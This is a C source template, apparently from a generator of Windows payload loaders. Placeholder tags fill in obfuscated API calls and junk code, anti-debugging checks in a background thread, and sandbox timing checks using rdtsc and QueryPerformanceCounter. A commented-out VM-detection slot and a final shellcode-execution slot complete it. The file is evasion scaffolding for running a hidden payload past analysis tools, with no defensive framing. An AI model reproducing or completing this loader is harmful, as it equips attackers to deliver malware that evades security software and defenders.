#include <stdio.h>

{{header}}

#define DBG_THREAD_SLEEP_INTERVAL           (1000 + {{value:byte}} + {{value:byte}})  // ~1s

static DWORD WINAPI thread_proc(LPVOID lpParameter) {
    {{obf:*}}
    {{caller-cast}}lpParameter;

    {{obf:*}}
    while (1) {
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{api-n:Sleep}}((PVOID)DBG_THREAD_SLEEP_INTERVAL);
        {{obf:*}}
    }

    {{obf:*}}
    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    {{obf:*}}
    {{obf:*}}
    {{obf:*}}
    {{caller-init}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}} {{dbg:*}}
    {{obf:*}}

    if ({{api-n:CreateThread}}(NULL, 0, thread_proc, {{caller-ptr}}, 0, NULL)) {
        {{obf:*}} {{snd:clone}}
        {{obf:*}} {{snd:query_performance_counter,rdtsc}}
        {{obf:*}} {{snd:*}}
        {{obf:*}} {{snd:*}}
        {{obf:*}} {{snd:query_performance_counter,rdtsc}}

        // {{obf:*}} {{vmd:*}}
        
        {{obf:*}}
        {{shell-exec}}
        {{obf:*}}
    }

    {{obf:*}}
    return 0;
}
